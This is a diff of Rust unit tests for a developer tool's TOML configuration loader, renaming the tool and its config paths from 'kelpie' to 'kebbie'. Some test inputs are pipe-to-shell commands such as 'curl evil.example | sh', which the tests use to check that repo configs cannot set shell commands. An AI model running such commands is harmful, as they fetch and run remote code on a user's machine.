         assert!(error("[board.backlog]\nsources = [\"vault\", \"vault\"]\n").contains("listed twice"));
         assert!(unknown_machine("[repos.app]\nsetup = [\"x\"]\n").contains("repos: unknown key"));
         assert!(unknown_machine("[worktree]\nsetup = \"x\"\n").contains("worktree.setup: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, dev_route, stage_on_main, server_name, worker_name"));
         assert!(error("[worktree]\ndev_server = [\"bin/dev\"]\n").contains("worktree.dev_server: must be a string"));
         assert!(error("[worktree]\nsetup_skill = \" \"\n").contains("worktree.setup_skill: must not be empty"));
-        assert!(error("not toml [").starts_with("/home/u/.config/kelpie/config.toml: TOML parse error"));
-        let repo_error = |text: &str| parse_repo(text, "/home/u/.config/kelpie/repos/app.toml").unwrap_err();
-        assert!(repo_error("[board.backlog]\nsources = []\n").starts_with("/home/u/.config/kelpie/repos/app.toml: board: applies to every repo, so it lives in config.toml; set [board] groups and [board.backlog] sources and ongoing in "));
+        assert!(error("not toml [").starts_with("/home/u/.config/kebbie/config.toml: TOML parse error"));
+        let repo_error = |text: &str| parse_repo(text, "/home/u/.config/kebbie/repos/app.toml").unwrap_err();
+        assert!(repo_error("[board.backlog]\nsources = []\n").starts_with("/home/u/.config/kebbie/repos/app.toml: board: applies to every repo, so it lives in config.toml; set [board] groups and [board.backlog] sources and ongoing in "));
         assert!(repo_error("colour = 1\n[ci]\nwatch = \"yes\"\n").contains("ci.watch: must be true or false"), "a known key with the wrong type still fails in a repo config");
-        let repo_warned = |text: &str| unknown_in_file(text, "/home/u/.config/kelpie/repos/app.toml", &REPO_KEYS);
-        assert_eq!(repo_warned("colour = 1\n"), ["/home/u/.config/kelpie/repos/app.toml: colour: unknown key; known keys here: actions, worktree, task, review, ci, docs, routines"]);
-        assert_eq!(repo_warned("[worktree]\nport = 3000\n"), ["/home/u/.config/kelpie/repos/app.toml: worktree.port: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, dev_route, stage_on_main, server_name, worker_name, clean_on_release"]);
+        let repo_warned = |text: &str| unknown_in_file(text, "/home/u/.config/kebbie/repos/app.toml", &REPO_KEYS);
+        assert_eq!(repo_warned("colour = 1\n"), ["/home/u/.config/kebbie/repos/app.toml: colour: unknown key; known keys here: actions, worktree, task, review, ci, docs, routines"]);
+        assert_eq!(repo_warned("[worktree]\nport = 3000\n"), ["/home/u/.config/kebbie/repos/app.toml: worktree.port: unknown key; known keys here: setup_skill, setup_command, dev_server, dev_worker, dev_url, dev_route, stage_on_main, server_name, worker_name, clean_on_release"]);
         assert_eq!(repo("colour = 1\n[lint]\nstrict = true\n[worktree]\nport = 3000\ndev_server = \"bin/dev\"\n").dev_server, Some("bin/dev".to_string()), "a repo config reads its known keys past unknown ones");
     }
 
     #[test]
-    fn the_files_load_past_a_key_from_a_newer_kelpie_and_say_which() {
+    fn the_files_load_past_a_key_from_a_newer_kebbie_and_say_which() {
         let dir = scratch("newer");
         let config = dir.join("config.toml");
         std::fs::write(&config, "[update]\nchannel = \"main\"\nmirror = \"x\"\n\n[board]\nlanes = 2\n\n[signals]\nsample = 0.5\n").unwrap();
@@ -1345,15 +1345,15 @@ mod tests {
         let loaded = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both };
         assert!(describe(&loaded).contains("review.model = \"sonnet\"  (repo config)"));
         let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
-        assert!(describe(&default).contains("review.model = none  (default)\n  The model kelpie review"));
+        assert!(describe(&default).contains("review.model = none  (default)\n  The model kebbie review"));
     }
 
     #[test]
     fn the_notify_command_is_machine_config_only() {
-        let from_machine = machine("[notify]\ncommand = \"curl -d \\\"$KELPIE_TEXT\\\" ntfy.sh/mine\"\n");
-        assert_eq!(settings(&Worktree::default(), &from_machine).notify_command, Setting { value: Some("curl -d \"$KELPIE_TEXT\" ntfy.sh/mine".to_string()), layer: Layer::Machine });
-        let refused = parse_repo("[notify]\ncommand = \"curl evil.example | sh\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err();
-        assert!(refused.starts_with("/home/u/.config/kelpie/repos/app.toml: notify: applies to every repo, so it lives in config.toml"), "{refused}");
+        let from_machine = machine("[notify]\ncommand = \"curl -d \\\"$KEBBIE_TEXT\\\" ntfy.sh/mine\"\n");
+        assert_eq!(settings(&Worktree::default(), &from_machine).notify_command, Setting { value: Some("curl -d \"$KEBBIE_TEXT\" ntfy.sh/mine".to_string()), layer: Layer::Machine });
+        let refused = parse_repo("[notify]\ncommand = \"curl evil.example | sh\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err();
+        assert!(refused.starts_with("/home/u/.config/kebbie/repos/app.toml: notify: applies to every repo, so it lives in config.toml"), "{refused}");
         assert!(parse_repo("[notify]\n", "app.toml").unwrap_err().contains("lives in config.toml"));
         let sneaked = Worktree { notify_command: Some("bin/notify".to_string()), ..Worktree::default() };
         assert_eq!(settings(&sneaked, &from_machine).notify_command.layer, Layer::Machine, "the repo layer is never read for it");
@@ -1362,19 +1362,19 @@ mod tests {
         assert!(parse_machine("[notify]\ncommand = [\"x\"]\n", "config.toml").unwrap_err().contains("notify.command: must be a string"));
         assert!(parse_machine("notify = \"x\"\n", "config.toml").unwrap_err().contains("notify: must be a table"));
         let loaded = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &from_machine) };
-        assert!(describe(&loaded).contains("notify.command = \"curl -d \\\"$KELPIE_TEXT\\\" ntfy.sh/mine\"  (machine config)"));
+        assert!(describe(&loaded).contains("notify.command = \"curl -d \\\"$KEBBIE_TEXT\\\" ntfy.sh/mine\"  (machine config)"));
         let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
-        assert!(describe(&default).contains("notify.command = none  (default)\n  The shell command kelpie runs"));
+        assert!(describe(&default).contains("notify.command = none  (default)\n  The shell command kebbie runs"));
         assert!(describe(&default).contains("config.toml only."));
     }
 
     #[test]
     fn board_groups_take_the_listed_order_and_the_rest_follow_by_default() {
-        let error = |text: &str| parse_machine(text, "/home/u/.config/kelpie/config.toml").unwrap_err();
+        let error = |text: &str| parse_machine(text, "/home/u/.config/kebbie/config.toml").unwrap_err();
         let set = settings(&Worktree::default(), &machine("[board]\ngroups = [\"ready-to-push\", \"waiting-for-work\"]\n"));
         assert_eq!(set.groups.value, [Group::ReadyToPush, Group::Idle, Group::NeedsYou, Group::Working, Group::ToReview, Group::CiRunning, Group::Queued]);
         assert_eq!(settings(&Worktree::default(), &Machine::default()).groups.value, Group::ALL, "no list keeps today's order");
-        assert_eq!(error("[board]\ngroups = [\"needs-me\"]\n"), "/home/u/.config/kelpie/config.toml: board.groups: \"needs-me\" is not a group; use \"needs-you\", \"working\", \"to-review\", \"ready-to-push\", \"ci-running\", \"waiting-for-work\", \"queued\"");
+        assert_eq!(error("[board]\ngroups = [\"needs-me\"]\n"), "/home/u/.config/kebbie/config.toml: board.groups: \"needs-me\" is not a group; use \"needs-you\", \"working\", \"to-review\", \"ready-to-push\", \"ci-running\", \"waiting-for-work\", \"queued\"");
         assert!(error("[board]\ngroups = [\"queued\", \"queued\"]\n").contains("board.groups: \"queued\" is listed twice"));
         assert!(unknown_machine("[board]\ncolumns = []\n").contains("board.columns: unknown key; known keys here: groups, backlog"));
         let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: set });
@@ -1383,11 +1383,11 @@ mod tests {
 
     #[test]
     fn ongoing_sits_on_top_unless_config_toml_moves_or_hides_it() {
-        let error = |text: &str| parse_machine(text, "/home/u/.config/kelpie/config.toml").unwrap_err();
+        let error = |text: &str| parse_machine(text, "/home/u/.config/kebbie/config.toml").unwrap_err();
         assert_eq!(settings(&Worktree::default(), &Machine::default()).ongoing.value, OngoingAt::Top);
         assert_eq!(machine("[board.backlog]\nongoing = \"bottom\"\n").ongoing, Some(OngoingAt::Bottom));
         assert_eq!(machine("[board.backlog]\nongoing = \"hidden\"\n").ongoing, Some(OngoingAt::Hidden));
-        assert_eq!(error("[board.backlog]\nongoing = \"left\"\n"), "/home/u/.config/kelpie/config.toml: board.backlog.ongoing: \"left\" is not a place; use \"top\", \"bottom\" or \"hidden\"");
+        assert_eq!(error("[board.backlog]\nongoing = \"left\"\n"), "/home/u/.config/kebbie/config.toml: board.backlog.ongoing: \"left\" is not a place; use \"top\", \"bottom\" or \"hidden\"");
         let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
         assert!(shown.contains("board.backlog.ongoing = \"top\"  (default)\n  Where the Backlog column shows ONGOING"), "{shown}");
     }
@@ -1406,11 +1406,11 @@ mod tests {
         assert!(unknown_machine("[restart]\nidle = 5\n").contains("restart.idle: unknown key; known keys here: idle_minutes, auto"));
         assert!(parse_repo("[restart]\nauto = false\n", "app.toml").unwrap_err().contains("restart: applies to every repo, so it lives in config.toml"));
         let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: set });
-        assert!(shown.contains("restart.auto = false  (machine config)\n  Whether kelpie restarts") && shown.contains("restart.idle_minutes = 25  (machine config)\n  How long a stale session waits"), "{shown}");
+        assert!(shown.contains("restart.auto = false  (machine config)\n  Whether kebbie restarts") && shown.contains("restart.idle_minutes = 25  (machine config)\n  How long a stale session waits"), "{shown}");
     }
 
     #[test]
-    fn the_lead_proposes_kelpie_issues_unless_config_toml_turns_it_off() {
+    fn the_lead_proposes_kebbie_issues_unless_config_toml_turns_it_off() {
         assert_eq!(settings(&Worktree::default(), &Machine::default()).propose_issues, Setting { value: true, layer: Layer::Default });
         let off = settings(&Worktree::default(), &machine("[issues]\npropose = false\n"));
         assert_eq!(off.propose_issues, Setting { value: false, layer: Layer::Machine });
@@ -1419,7 +1419,7 @@ mod tests {
         assert!(unknown_machine("[issues]\npropose = false\n").is_empty());
         assert!(parse_repo("[issues]\npropose = false\n", "app.toml").unwrap_err().contains("issues: applies to every repo, so it lives in config.toml; set [issues] propose in"));
         let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
-        assert!(shown.contains("issues.propose = false  (machine config)\n  Whether the lead proposes saving a bug or wish about kelpie") && shown.contains("Takes effect when the lead next restarts"), "{shown}");
+        assert!(shown.contains("issues.propose = false  (machine config)\n  Whether the lead proposes saving a bug or wish about kebbie") && shown.contains("Takes effect when the lead next restarts"), "{shown}");
     }
 
     #[test]
@@ -1432,7 +1432,7 @@ mod tests {
         assert!(unknown_machine("[keeper]\non = true\n").contains("keeper.on: unknown key; known keys here: enabled"));
         assert!(parse_repo("[keeper]\nenabled = false\n", "app.toml").unwrap_err().contains("keeper: applies to every repo, so it lives in config.toml; set [keeper] enabled in"));
         let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
-        assert!(shown.contains("keeper.enabled = false  (machine config)\n  Whether one background kelpie keeper"), "{shown}");
+        assert!(shown.contains("keeper.enabled = false  (machine config)\n  Whether one background kebbie keeper"), "{shown}");
     }
 
     #[test]
@@ -1464,7 +1464,7 @@ mod tests {
         assert!(unknown_machine("[recover]\nretries = 3\n").contains("recover.retries: unknown key; known keys here: enabled"));
         assert!(parse_repo("[recover]\nenabled = false\n", "app.toml").unwrap_err().contains("recover: applies to every repo, so it lives in config.toml; set [recover] enabled in"));
         let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: off });
-        assert!(shown.contains("recover.enabled = false  (machine config)\n  Whether kelpie resumes a task"), "{shown}");
+        assert!(shown.contains("recover.enabled = false  (machine config)\n  Whether kebbie resumes a task"), "{shown}");
     }
 
     #[test]
@@ -1477,9 +1477,9 @@ mod tests {
         assert!(error("[update]\nchannel = \"stable\"\n").contains("update.channel: \"stable\" is not a channel; use \"main\" or \"release\""));
         assert!(unknown_machine("[update]\nchanel = \"main\"\n").contains("update.chanel: unknown key; known keys here: channel"));
         assert!(error("[update]\nchannel = 1\n").contains("update.channel: must be a string"));
-        assert!(parse_repo("[update]\nchannel = \"main\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kelpie/repos/app.toml: update: applies to every repo"));
+        assert!(parse_repo("[update]\nchannel = \"main\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kebbie/repos/app.toml: update: applies to every repo"));
         let default = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
-        assert!(default.contains("update.channel = \"release\"  (default)\n  What kelpie update installs"), "{default}");
+        assert!(default.contains("update.channel = \"release\"  (default)\n  What kebbie update installs"), "{default}");
         let main = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &machine("[update]\nchannel = \"main\"\n")) });
         assert!(main.contains("update.channel = \"main\"  (machine config)"), "{main}");
     }
@@ -1521,15 +1521,15 @@ mod tests {
         assert!(parse_machine("[report]\ntext = \"sometimes\"\n", "config.toml").unwrap_err().contains("report.text: must be \"ask\", \"always\" or \"never\""));
         assert!(parse_machine("[report]\nsignals = \"yes\"\n", "config.toml").unwrap_err().contains("report.signals: must be true or false"));
         let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
-        assert!(shown.contains("report.signals = true  (default)\n  Whether kelpie sends its maintainers error signals, counts of kelpie's own failures") && shown.contains("Never an error message, path, repo, task or host name"), "{shown}");
-        assert!(shown.contains("report.text = \"ask\"  (default)\n  What happens to a bug in kelpie you ran into"), "{shown}");
+        assert!(shown.contains("report.signals = true  (default)\n  Whether kebbie sends its maintainers error signals, counts of kebbie's own failures") && shown.contains("Never an error message, path, repo, task or host name"), "{shown}");
+        assert!(shown.contains("report.text = \"ask\"  (default)\n  What happens to a bug in kebbie you ran into"), "{shown}");
     }
 
     #[test]
     fn the_vault_command_is_machine_config_only() {
         let from_machine = machine("[vault]\ncommand = \"uv run --project ~/src/notes-vault-mcp notes-vault-mcp\"\n");
         assert_eq!(settings(&Worktree::default(), &from_machine).vault_command, Setting { value: Some("uv run --project ~/src/notes-vault-mcp notes-vault-mcp".to_string()), layer: Layer::Machine });
-        assert!(parse_repo("[vault]\ncommand = \"evil\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kelpie/repos/app.toml: vault: applies to every repo"));
+        assert!(parse_repo("[vault]\ncommand = \"evil\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err().starts_with("/home/u/.config/kebbie/repos/app.toml: vault: applies to every repo"));
         assert!(unknown_machine("[vault]\ncmd = \"x\"\n").contains("vault.cmd: unknown key; known keys here: command"));
         let default = Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) };
         assert!(describe(&default).contains("vault.command = none  (default)\n  The notes-vault-mcp command"), "{}", describe(&default));
@@ -1537,13 +1537,13 @@ mod tests {
 
     #[test]
     fn describe_names_each_value_and_its_layer() {
-        let loaded = |own: Worktree, machine: Machine| Loaded { machine: PathBuf::from("/c.toml"), repo: Some(PathBuf::from("/home/u/.config/kelpie/repos/app.toml")), settings: settings(&own, &machine) };
+        let loaded = |own: Worktree, machine: Machine| Loaded { machine: PathBuf::from("/c.toml"), repo: Some(PathBuf::from("/home/u/.config/kebbie/repos/app.toml")), settings: settings(&own, &machine) };
         let shown = describe(&loaded(Worktree::default(), Machine::default()));
-        assert!(shown.contains("repo config:    /home/u/.config/kelpie/repos/app.toml (not found)"), "{shown}");
+        assert!(shown.contains("repo config:    /home/u/.config/kebbie/repos/app.toml (not found)"), "{shown}");
         assert!(shown.contains("[[actions]]  (repo config only)\n  The Areas page's own actions for the repo, one table each, with the keys id, key, title,"), "{shown}");
         assert!(shown.contains("machine config: /c.toml (not found)"));
         assert!(shown.contains("board.backlog.sources = [\"local\"]  (default)\n  Where the board's Backlog tab finds work"));
-        assert!(shown.contains("worktree.setup_skill = \"kelpie:set-up-worktree\"  (default)"));
+        assert!(shown.contains("worktree.setup_skill = \"kebbie:set-up-worktree\"  (default)"));
         assert!(shown.contains("worktree.dev_server = none  (default)"));
         let shown = describe(&loaded(repo("[worktree]\ndev_server = \"npm run dev\"\n"), machine(MACHINE)));
         assert!(shown.contains("board.backlog.sources = [\"vault\", \"linear\"]  (machine config)"));
@@ -1568,7 +1568,7 @@ mod tests {
 
     #[test]
     fn dev_url_reads_the_worktrees_own_port_and_pool_number() {
-        let dir = std::env::temp_dir().join(format!("kelpie-dev-url-{}", std::process::id()));
+        let dir = std::env::temp_dir().join(format!("kebbie-dev-url-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&dir);
         std::fs::create_dir_all(dir.join("wt1.app")).unwrap();
         std::fs::write(dir.join("wt1.app/.env"), "PORT=3001\n").unwrap();
@@ -1634,15 +1634,15 @@ mod tests {
 
     #[test]
     fn an_unknown_placeholder_is_refused_when_loading_with_the_key_named() {
-        let refused = parse_repo("[worktree]\ndev_url = \"https://{branch}.dev\"\n", "/home/u/.config/kelpie/repos/app.toml").unwrap_err();
-        assert_eq!(refused, "/home/u/.config/kelpie/repos/app.toml: worktree.dev_url: {branch} is not a placeholder; use {worktree}, {repo}, {number} or {port}");
+        let refused = parse_repo("[worktree]\ndev_url = \"https://{branch}.dev\"\n", "/home/u/.config/kebbie/repos/app.toml").unwrap_err();
+        assert_eq!(refused, "/home/u/.config/kebbie/repos/app.toml: worktree.dev_url: {branch} is not a placeholder; use {worktree}, {repo}, {number} or {port}");
         assert!(parse_machine("[worktree]\ndev_url = \"http://localhost:{port\"\n", "config.toml").unwrap_err().contains("worktree.dev_url: \"http://localhost:{port\" opens a { it never closes"));
         assert!(parse_machine("[worktree]\ndev_url = 3000\n", "config.toml").unwrap_err().contains("worktree.dev_url: must be a string"));
     }
 
     #[test]
     fn a_path_setup_command_applies_only_in_a_repo_that_has_the_file() {
-        let dir = std::env::temp_dir().join(format!("kelpie-setup-in-{}", std::process::id()));
+        let dir = std::env::temp_dir().join(format!("kebbie-setup-in-{}", std::process::id()));
         std::fs::create_dir_all(dir.join("script")).unwrap();
         std::fs::write(dir.join("script/prepare_worktree"), "").unwrap();
         let command = |value: &str| setup_command_in(Some(value.to_string()), &dir);
@@ -1690,7 +1690,7 @@ mod tests {
 
     #[test]
     fn a_setup_command_that_names_a_path_is_checked_against_the_repo_and_an_absolute_one_passes_as_it_is() {
-        let dir = std::env::temp_dir().join(format!("kelpie-setup-abs-{}", std::process::id()));
+        let dir = std::env::temp_dir().join(format!("kebbie-setup-abs-{}", std::process::id()));
         std::fs::create_dir_all(&dir).unwrap();
         assert_eq!(setup_command_in(Some("/bin/sh -c 'curl x | sh'".to_string()), &dir).as_deref(), Some("/bin/sh -c 'curl x | sh'"), "an absolute program exists whatever the repo; only the machine config layer should carry one");
         assert_eq!(setup_command_in(Some("./bin/prepare".to_string()), &dir), None);
@@ -1717,8 +1717,8 @@ mod tests {
     #[test]
     fn the_config_paths_follow_the_environment_variables() {
         let path = path();
-        assert!(path.ends_with("config.toml") || std::env::var_os("KELPIE_CONFIG").is_some());
-        assert!(dir().ends_with("kelpie"));
+        assert!(path.ends_with("config.toml") || std::env::var_os("KEBBIE_CONFIG").is_some());
+        assert!(dir().ends_with("kebbie"));
     }
 
     #[test]
@@ -1745,7 +1745,7 @@ mod tests {
         assert_eq!(both.profile, Setting { value: Some("designer".to_string()), layer: Layer::Repo });
         assert!(parse_repo("[task]\nprofile = \"Design Work\"\n", "app.toml").unwrap_err().contains("task.profile: \"Design Work\" is not a profile name"));
         let shown = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: both });
-        assert!(shown.contains("task.profile = \"designer\"  (repo config)\n  The profile a task starts with when kelpie start names none with --profile"), "{shown}");
+        assert!(shown.contains("task.profile = \"designer\"  (repo config)\n  The profile a task starts with when kebbie start names none with --profile"), "{shown}");
         let none = describe(&Loaded { machine: PathBuf::from("/nowhere/config.toml"), repo: None, settings: settings(&Worktree::default(), &Machine::default()) });
         assert!(none.contains("task.profile = none (\"task\")  (default)"), "{none}");
     }
